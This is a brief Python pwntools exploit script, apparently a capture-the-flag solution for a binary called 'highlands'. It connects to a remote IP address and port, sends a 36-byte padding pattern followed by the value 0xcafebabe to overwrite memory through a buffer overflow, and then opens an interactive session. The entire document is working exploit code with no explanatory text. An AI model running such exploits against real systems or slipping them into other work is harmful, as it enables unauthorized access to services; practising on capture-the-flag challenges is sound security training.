#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF('./highlands', checksec = False) 

#gdb.attach(p)

HOST = '14.225.212.104'

PORT = 9000

p = remote(HOST, PORT)


payload = cyclic(36) + p32(0xcafebabe)

p.send(payload)



p.interactive()

